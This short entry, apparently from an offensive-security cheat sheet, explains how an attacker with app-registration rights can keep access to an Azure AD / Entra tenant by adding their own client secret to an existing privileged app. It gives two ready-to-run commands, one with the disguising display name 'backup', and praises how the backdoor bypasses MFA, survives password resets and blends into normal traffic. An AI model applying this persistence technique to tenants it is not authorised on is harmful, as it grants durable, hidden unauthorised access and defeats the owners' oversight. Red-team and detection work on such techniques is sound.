With rights over an app registration / service principal (`Application.ReadWrite`,
or a compromised privileged role), add your *own* client secret or certificate to
an existing privileged app. You then authenticate **as that app** —
non-interactive, no MFA, surviving user password resets: a durable cloud backdoor
that blends into normal app traffic. (Cloud — no on-host target, so no slots.)

```powershell
az ad app credential reset --id <app-id> --append
Add-MgApplicationPassword -ApplicationId <app-object-id> -PasswordCredential @{ displayName = "backup" }
```
